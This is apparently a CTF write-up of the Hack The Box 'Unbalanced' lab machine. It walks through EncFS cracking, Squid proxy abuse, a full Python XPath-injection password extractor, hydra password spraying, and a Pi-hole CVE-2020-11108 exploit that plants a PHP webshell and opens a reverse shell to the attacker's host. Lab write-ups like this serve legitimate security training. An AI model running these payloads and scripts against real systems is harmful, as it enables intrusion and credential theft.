---
layout: post
title: "Hack The Box - Unbalanced Writeup"
author: Chr0x6eOs
date: "2020-12-05"
subject: "Unbalanced Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux, rsync, EncFS, john, http-proxy, squid, python, XPath injection, hydra, Pi-Hole, docker]
lang: "en"
image:
    path: assets/htb/Unbalanced/logo.png
    width: 300
    height: 300
...

![Unbalanced](/assets/htb/Unbalanced/unbalanced.png)

[Unbalanced](https://www.hackthebox.eu/home/machines/profile/268) is a hard linux box by [polarbearer](https://www.hackthebox.eu/home/users/profile/159204) and [GibParadox](https://www.hackthebox.eu/home/users/profile/125033). 

### Overview

The box starts with rsync enumeration, where we find EncFS-encrypted configuration files. Cracking the EncFS password, we get access to the configuration files, which leak credentials for the http-proxy. Using the credentials, we can connect to the http-proxy and use `fqdncache` to read the DNS-cache of the proxy. This gives us multiple internal hosts that are accessible through the proxy. There seems to be multiple instances of the same website running in order to do load-balancing. As "host2" and "host3" are available, accessing host1 (which is shown to be inaccessible due to maintenance) gives us access to an unpatched version of the website. Enumerating the login prompt, we find a XPath-injection vulnerability, which we can use to leak the passwords of all users in the database. Using these credentials, we can test them against SSH using hydra, which returns a valid login. Using the credentials, we can ssh into the machine and can read user.txt.

Enumerating the system for a privilege-escalation-vector, we find that a Pi-Hole instance seem to be installed on the network. Checking the arp-table, we can find an additional host on the system. This host seems to be running the Pi-Hole installation. Using default creds, we can login to the admin-panel and find that a vulnerable version of Pi-Hole is installed. Exploiting the Pi-Hole vulnerability, we get remote-code-execution on the system.

Enumerating the Pi-Hole system, we find a installation-script, which contains hard-coded credentials. Using these credentials, we can su to root and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.200
Nmap scan report for 10.10.10.200
Host is up (0.049s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The open ports shown are **22** (ssh), **873** (rsync) and **3128** (http-proxy). Both rsync and http-proxy seems interesting. Let us start our enumeration with rsync.

### rsync - Port 873

Let us start by listing the available files.

```bash
root@darkness:~# rsync -a rsync://10.10.10.200:873 --list-only
conf_backups    EncFS-encrypted configuration backups
```

Seems like we have a `EncFS-encrypted` configuration backup. Let us sync the file to get a better look at it.

```bash
root@darkness:~# rsync -av rsync://10.10.10.200:873/conf_backups rsync/
receiving incremental file list
created directory rsync
./
,CBjPJW4EGlcqwZW4nmVqBA6
-FjZ6-6,Fa,tMvlDsuVAO7ek
.encfs6.xml
0K72OfkNRRx3-f0Y6eQKwnjn
27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
[...]
uEtPZwC2tjaQELJmnNRTCLYU
vCsXjR1qQmPO5g3P3kiFyO84
waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

sent 1,452 bytes  received 411,990 bytes  35,951.48 bytes/sec
total size is 405,603  speedup is 0.98
```

We receive the encrypted backups. Now we have to find a way to decrypt the files.

#### Cracking EncFS password

A quick [google search](https://www.google.com/search?q=cracking+encfs) reveals that John is capable to crack the EncFS system, if the `.encfs6.xml` file is available. (According to [this StackExchange Thread](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml)).

For this, we have to use `encfs2john` to extract the hash, that we can then crack.

```bash
root@darkness:~# /usr/share/john/encfs2john.py rsync/ > encfs6.xml.john
root@darkness:~# cat encfs6.xml.john 
rsync/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
```

Now that we have extracted the hash, let us use john to crack it.

```bash
root@darkness:~# john encfs6.xml.john -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
bubblegum        (rsync/)
```

We successfully crack the password used: `bubblegum`. Now let us decrypt the files.

#### Decrypting the backup-files

```bash
root@darkness:~# encfs $(pwd)/rsync /mnt/encfs
The directory "/mnt/encfs/" does not exist. Should it be created? (y,N) Y
EncFS Password: bubblegum
```

We successfully decrypt the backup and are now able to read all files:

```bash
root@darkness:/mnt/encfs# ls -lah
total 628K
drwxr-xr-x 2 root root 4.0K Apr  4  2020 .
drwxr-xr-x 4 root root 4.0K Dec  2 13:33 ..
-rw-r--r-- 1 root root  267 Apr  4  2020 50-localauthority.conf
-rw-r--r-- 1 root root  455 Apr  4  2020 50-nullbackend.conf
-rw-r--r-- 1 root root   48 Apr  4  2020 51-debian-sudo.conf
-rw-r--r-- 1 root root  182 Apr  4  2020 70debconf
-rw-r--r-- 1 root root 2.3K Apr  4  2020 99-sysctl.conf
-rw-r--r-- 1 root root 4.5K Apr  4  2020 access.conf
-rw-r--r-- 1 root root 3.0K Apr  4  2020 adduser.conf
[...]
-rw-r--r-- 1 root root  677 Apr  4  2020 timesyncd.conf
-rw-r--r-- 1 root root 1.3K Apr  4  2020 ucf.conf
-rw-r--r-- 1 root root  281 Apr  4  2020 udev.conf
-rw-r--r-- 1 root root  378 Apr  4  2020 update-initramfs.conf
-rw-r--r-- 1 root root 1.2K Apr  4  2020 user.conf
-rw-r--r-- 1 root root  414 Apr  4  2020 user-dirs.conf
-rw-r--r-- 1 root root 1.9K Apr  4  2020 Vendor.conf
-rw-r--r-- 1 root root 1.5K Apr  4  2020 wpa_supplicant.conf
-rw-r--r-- 1 root root  100 Apr  4  2020 x86_64-linux-gnu.conf
-rw-r--r-- 1 root root  642 Apr  4  2020 xattr.conf
```

Looking through the files we can find a interesting information:

```bash
root@darkness:/mnt/encfs# cat squid.conf
#       WELCOME TO SQUID 4.6
#       ----------------------------
#
#       This is the documentation for the Squid configuration file.
#       This documentation can also be found online at:
#               http://www.squid-cache.org/Doc/config/
[...]
# Only allow cachemgr access from localhost
#http_access allow localhost manager
#http_access deny manager
http_access allow manager
[...]
# Allow access to intranet
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net

# And finally deny all other access to this proxy
http_access deny all
[...]
#Example:
# cachemgr_passwd secret shutdown
# cachemgr_passwd lesssssssecret info stats/objects
# cachemgr_passwd disable all
#Default:
# No password. Actions which require password are denied.
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
```

The `squid.conf` file is very interesting. Not only does this probably mean that `squid 4.6` is running as the http-proxy, but we also know how it is setup.

It seems like we are able to access `cachemgr` and have access to the intranet. (Domain: `intranet.unbalanced.htb`) Finally, we have a password: `Thah$Sh1`, which we can use to access the proxy.

Let us setup the proxy and try to access the intranet.

### http-proxy - Port 3128

As we have access to the proxy and are allowed to run `fqdncache`, we can list all cached DNS-entries of the proxy, potentially leaking more hostnames.

```bash
root@darkness:~# squidclient -h 10.10.10.200 -p 3128 -w 'Thah$Sh1' mgr:fqdncache
squidclient -h 10.10.10.200 -p 3128 -w 'Thah$Sh1' mgr:fqdncache
HTTP/1.1 200 OK
[...]
FQDN Cache Statistics:
FQDNcache Entries In Use: 9
FQDNcache Entries Cached: 8
FQDNcache Requests: 104
FQDNcache Hits: 0
FQDNcache Negative Hits: 0
FQDNcache Misses: 104
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
```

Additionally to `intranet.unbalanced.htb`, we get two new hostnames: `intranet-host2.unbalanced.htb` and `intranet-host3.unbalanced.htb`. Let us now setup the http-proxy and access these hosts.

#### Setting up the http-proxy

In order to easily browse the intranet using the http-proxy, we can setup the proxy using [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search).

First we create a new proxy by using the `Add` option.

![Adding new proxy](/assets/htb/Unbalanced/http-proxy/setup-proxy.png)

We add a new proxy with the IP, Port and Password that we gathered earlier. Now in order to only route traffic through this proxy that actually goes to the machine, we can add a pattern.

![Adding pattern](/assets/htb/Unbalanced/http-proxy/proxy-pattern.png)

We add a pattern that everything matching the wildcard `*unbalanced.htb` or the specified IPs, will be routed through the proxy.

With this set, we can have multiple proxies available at a time:

![All proxies setup](/assets/htb/Unbalanced/http-proxy/all-proxy-patterns.png)

With this setup, all `*.htb` will be routed to `Burp` (except the `*unbalanced.htb`ones). Everything going through the net, will be routed to `No Proxy` and everything going to localhost will go through the `Socks5` proxy.

Now with the proxy setup, we can access the intranet webpage.

#### Enumerating intranet.unbalanced.htb

Going to http://intranet.unbalanced.htb/, http://172.17.0.1, http://172.31.179.2  or http://172.17.179.3 we get redirected to `/intranet.php` and get shown following page:

![Intranet webpage](/assets/htb/Unbalanced/http-proxy/http/webpage-index.png)

As all hosts show the same webpage (and because of the name of the box), I assume that the other hosts are used for load-**balancing**.

Now as http://172.31.179.2  and http://172.17.179.3 is available, what does http://172.31.179.1 do? Let us access the ip to find out.

Going to http://172.31.179.1, we get shown following error:

![Temporary down error](/assets/htb/Unbalanced/http-proxy/http/host-1-error.png)

This sounds very interesting! Let us enumerate this host with a gobuster.

```bash
root@darkness:~# gobuster dir -u http://172.31.179.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -x php,txt --proxy http://10.10.10.200:3128
[...]
===============================================================
/index.php (Status: 200)
/css/ (Status: 403)            
/intranet.php (Status: 200)
```

The gobuster eventually showed `/intranet.php`, which was already known to us. Seems like the intranet is still available even though the index page said the host was down? Let us enumerate the intranet of the host `172.31.179.1`.

#### Enumerating host 172.31.179.1

As login seems to be the only interesting part, let us try default credentials and basic SQL-injection payloads.

![Default creds login](/assets/htb/Unbalanced/http-proxy/http/login-def-creds.png)

When trying some default credentials, we get `Invalid credentials` as the response. Let us try `'` next and see how the application behaves.

![Quote login](/assets/htb/Unbalanced/http-proxy/http/login-quote.png)

When using single-quotes, we do not get `Invalid credentials` as a response. There seems to be some sort of boolean/error-based injection.

Let us try `' or '1'='1` as a payload next.

![Injection payload](/assets/htb/Unbalanced/http-proxy/http/login-injection.png)

We seem to leak all database-entries using this payload. However, we do not have any password that would be of value yet. Let us try to get credentials by using this injection.

After a lot of trying I eventually came to the conclusion that this is no SQL-like-injection. A bit of research revealed, that this is probably a [XPATH injection](https://owasp.org/www-community/attacks/XPATH_Injection). We can use the payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection#exploitation).

#### Exploiting the XPATH injection

Using the payload: `<USERNAME>' and starts-with(Password, '<PART-OF-PASSWORD>') or '1'='1` we can slowly leak the password of the specified user.

In order to exploit the XPATH-injection, I created a simple [python script](https://github.com/chr0x6eos/HTB/blob/master/Unbalanced/xpath.py), which is available on my [GitHub](https://github.com/chr0x6eos/HTB/tree/master/Unbalanced). For this we need a couple of functions.

First, we create a function to simply send requests to the login form and return the html.

```python
# Send POST-request
def send_req(username:str="",password:str="") -> str:
    data = {
        'Username':username,
        'Password':password
    }
    return requests.post(url, data=data, proxies=proxy).text
```

Next, we create a function to parse the usernames.

```python
# Returns all usernames
def get_users() -> list:
    html = send_req("' or '1'='1","' or '1'='1")
    # Parse usernames
    soup = BeautifulSoup(html, 'html.parser')
    usernames = []
    # Usernames are in a <p class="w3-opacity"> element
    [usernames.append(p.text.strip()) for p in soup.find_all('p', {"class": "w3-opacity"})]
    return sorted(usernames) # Sort list by alphabet
```

Next, we define a function to check if the password was ok.

```python
# Returns True if part of password is OK
def check_pw(payload:str="") -> bool:
    return "Invalid credentials" not in send_req(username=payload)
```

Now we create a function to get the password for the specified user.

```python
# Gets password of specified user
def get_password(user:str) -> str:
    password = ""
    while True:
        for char in string.printable.strip():
            # Skip single-quote, as it break query
            if char == "'":
                continue
            # Payload to get password char-by-char
            payload = f"{user}' and starts-with(Password, '{password}{char}') or '1'='1"
            try:
                # Check if current char is valid
                if check_pw(payload=payload):
                    clear()
                    password += char
                    print(f"[*] Password: {password}")
                    break
            except Exception as ex:
                print(f"[!] Error: {ex}")
                break
        else: # No char valid, password done
            break
    clear()
    return password
```

Finally, we create the main function.

```python
if __name__ == "__main__":
    usernames = get_users()
    creds = [] # List of all creds, can be used to write to file
    for user in usernames:
        print(f"[*] Getting password of {user}...\n")
        pw = get_password(user)
        clear()
        print(f"[+] Got password of {user}: {pw}")
        creds.append([user,pw])
    
    # Write creds to file
    with open("wordlist.txt", "w") as file:
        for cred in creds:
            file.write(f"{cred[0]}:{cred[1]}")
```

Now we can run the exploit to get all usernames:

![Running the exploit](/assets/htb/Unbalanced/http-proxy/http/sqli.gif)

```python
root@darkness:~# python3 exploit.py
[+] Got password of bryan: ireallyl0vebubblegum!!!
[+] Got password of jim: stairwaytoheaven
[+] Got password of rita: password01!
[+] Got password of sarah: sarah4evah
```

We now have four sets of credentials.

#### Password-spraying

 Let us use hydra to test the found username-password sets against SSH.

```bash
root@darkness:~# hydra -C wordlist.txt ssh://10.10.10.200
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries, ~1 try per task
[DATA] attacking ssh://10.10.10.200:22/
[22][ssh] host: 10.10.10.200   login: bryan   password: ireallyl0vebubblegum!!!
1 of 1 target successfully completed, 1 valid password found
```

Seems like we have a valid login with the user bryan.

### Getting user

 Let us use the creds and login via ssh.

```bash
root@darkness:~# ssh bryan@10.10.10.200
bryan@10.10.10.200 password: ireallyl0vebubblegum!!!
Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4
bryan@unbalanced:~$
```

We are able to login via ssh and can read user.txt.

```bash
bryan@unbalanced:~$ cat user.txt 
2de5a***************************
```

## Privesc - Root

Now that we have user, let us enumerate the system to find a privesc-vector to root.

### Enumeration as bryan

Let us check out the home folder of bryan first:

```bash
bryan@unbalanced:~$ ls
TODO  user.txt
bryan@unbalanced:~$ cat TODO
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

Seems like there is `Pi-hole` installed on the system.

Let us check out all listening TCP-ports to see where `Pi-hole` is running.

```bash
bryan@unbalanced:~$ ss -tlnp
State          Recv-Q         Send-Q                   Local Address:Port                   Peer Address:Port         
LISTEN         0              5                              0.0.0.0:873                         0.0.0.0:*            
LISTEN         0              128                          127.0.0.1:8080                        0.0.0.0:*            
LISTEN         0              128                          127.0.0.1:5553                        0.0.0.0:*            
LISTEN         0              32                             0.0.0.0:53                          0.0.0.0:*            
LISTEN         0              128                            0.0.0.0:22                          0.0.0.0:*            
LISTEN         0              5                                 [::]:873                            [::]:*            
LISTEN         0              32                                [::]:53                             [::]:*            
LISTEN         0              128                               [::]:22                             [::]:*            
LISTEN         0              128                                  *:3128                              *:*
```

Port 8080 seems to be a good guess. Let us setup SOCKS-proxy using SSH.

### Privesc - Pi-hole

#### Accessing Pi-hole

```bash
ssh bryan@10.10.10.200 -D 1080
bryan@10.10.10.200 password: ireallyl0vebubblegum!!!
```

Accessing the port using the socks proxy:

![Access via localhost](/assets/htb/Unbalanced/privesc/socks-localhost.png)

Seems like we are unable to access via `127.0.0.1`. Let us search for the IP-address of the docker-container. We can check the arp-table of the host to see other machines on the network.

```bash
bryan@unbalanced:~$ ip neighbor
10.10.10.2 dev ens160 lladdr 00:50:56:b9:0d:fa REACHABLE
172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
fe80::250:56ff:feb9:dfa dev ens160 lladdr 00:50:56:b9:0d:fa router STALE
```

Seems like `172.31.11.3` is another host in the network. Let us try to access the host.

 ```bash
bryan@unbalanced:~$ nc 172.31.11.3 8080
(UNKNOWN) [172.31.11.3] 8080 (http-alt) : Connection refused
 ```

Seems like port 8080 is not open. Let us run a quick port scan using proxychains.

```bash
root@darkness:~# proxychains -q nmap 172.31.11.3 -sT -Pn -n
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Nmap scan report for 172.31.11.3
Host is up (0.048s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 69.39 seconds
```

Seems like port 80 is open. Let us try to connect to the host using our SOCKS proxy.

![Access via ip](/assets/htb/Unbalanced/privesc/socks-access.png)

Seems like we are able to access the Pi-hole now. Let us enumerate the Pi-hole.

#### Enumerating Pi-hole

We can login to the /admin panel using the password: `admin`.

![Pi-hole version](/assets/htb/Unbalanced/privesc/pihole-version.png)

Seems like Pi-hole version `v4.3.1` is installed.

Searching for exploits, I came across [this article](https://frichetten.com/blog/cve-2020-11108-pihole-rce/), which shows how to get RCE on Pi-hole. There is also [an exploit-code](https://github.com/frichetten/CVE-2020-11108-PoC) available.

#### Manual exploitation

In order to manually exploit, we have to do a couple of steps:

1. Go to Setting -> Blocklist and enter following payload.

![Step 1](/assets/htb/Unbalanced/privesc/step1.png)

2. Starting a listener on port 80 and send 200-OK response with blob-data upon receiving request.

```bash
root@darkness:~# nc -lvnp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:59982.
GET / HTTP/1.1
Host: 10.10.14.22
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: */*

HTTP/1.1 200 OK

chronos chronos

^C
```

3. Start listener on port 80again
4. Upon redirection click on update button

![Pi-hole version](/assets/htb/Unbalanced/privesc/step4.png)

5. Send php webshell (or reverse-shell) as response upon request:

```bash
root@darkness:~# nc -lvnp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:60002.
POST / HTTP/1.1
Host: 10.10.14.22
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: */*
Content-Length: 8
Content-Type: application/x-www-form-urlencoded

.domains
<?php system($_REQUEST['cmd'])?>

^C
```

Webshell/reverse-shell is now available at: 

![RCE](/assets/htb/Unbalanced/privesc/rce.png)

We successfully get code-execution.

#### Automatic exploitation

I have created an [exploit-script](https://github.com/chr0x6eos/HTB/blob/master/Unbalanced/pi-hole-CVE-2020-11108.py) based on the steps above. It is available on my [GitHub](https://github.com/chr0x6eos/HTB/tree/master/Unbalanced).

```bash
root@darkness:~# python3 exploit.py 
[+] Got session-cookie: PHPSESSID=eflcgeupmevesfj6f616286e25
[+] Webshell uploaded successfully!
[*] Sending reverse-shell to 10.10.14.22:443
cmd> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Running the exploit, we get a webshell, as well as a reverse-shell (if we listen on port 443).

```bash
root@darkness:~# nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.200.
Ncat: Connection from 10.10.10.200:49032.
bash: cannot set terminal process group (526): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pihole:/var/www/html/admin/scripts/pi-hole/php$
```

### Enumerating docker-instance

Now that we have a shell on the docker-instance, let us enumerate it to find a possible privesc-vector.

Let us check out the root of the docker-instance.

```bash
www-data@pihole:/$ ls -lh 
total 132K
-rw-rw-r--   1 root root  14K Jun  2  2019 bash_functions.sh
drwxr-xr-x   1 root root  12K Sep 20  2019 bin
drwxr-xr-x   2 root root 4.0K Sep  8  2019 boot
drwxr-xr-x   5 root root  360 Dec  2 15:41 dev
drwxrwxr-x   1 root root 4.0K Dec  2 15:41 etc
drwxr-xr-x   2 root root 4.0K Sep  8  2019 home
drwxr-xr-x   1 root root 4.0K Sep 20  2019 lib
drwxr-xr-x   2 root root 4.0K Sep 10  2019 lib64
drwxr-xr-x   2 root root 4.0K Sep  9  2018 libexec
drwxr-xr-x   2 root root 4.0K Sep 10  2019 media
drwxr-xr-x   2 root root 4.0K Sep 10  2019 mnt
drwxr-xr-x   1 root root 4.0K Sep 20  2019 opt
-rw-r--r--   1 root root  14K Sep 20  2019 pihole-install.log
dr-xr-xr-x 244 root root    0 Dec  2 15:41 proc
drwxrwxr-x   1 root root 4.0K Apr  5  2020 root
drwxr-xr-x   1 root root 4.0K Dec  2 15:41 run
-rwxr-xr-x   1 root root  389 Sep  9  2018 s6-init
drwxr-xr-x   1 root root 4.0K Sep 20  2019 sbin
drwxr-xr-x   2 root root 4.0K Sep 10  2019 srv
-rwxrwxr-x   1 root root 1.9K Sep 17  2019 start.sh
dr-xr-xr-x  13 root root    0 Dec  2 18:30 sys
drwxrwxrwt   1 root root 4.0K Dec  2 18:30 tmp
drwxrwxr-x   1 root root 4.0K Sep 20  2019 usr
drwxr-xr-x   1 root root 4.0K Sep 20  2019 var
```

Seems like we are able to read /root folder.

```bash
www-data@pihole:/$ ls root/
ph_install.sh
pihole_config.sh
www-data@pihole:/$ cat root/pihole_config.sh
#!/bin/bash

# Add domains to whitelist
/usr/local/bin/pihole -w unbalanced.htb
/usr/local/bin/pihole -w rebalanced.htb

# Set temperature unit to Celsius
/usr/local/bin/pihole -a -c

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```

Looking at the `pihole_config.sh` script, we get credentials `bUbBl3gUm$43v3Ry0n3!`.

#### Getting shell as root

Let us try the found credentials for root.

```bash
bryan@unbalanced:~$ su root
Password: bUbBl3gUm$43v3Ry0n3!
root@unbalanced:/home/bryan#
```

We successfully su to root and can read root.txt.

```bash
root@unbalanced:~# cat root.txt 
05caa***************************
```
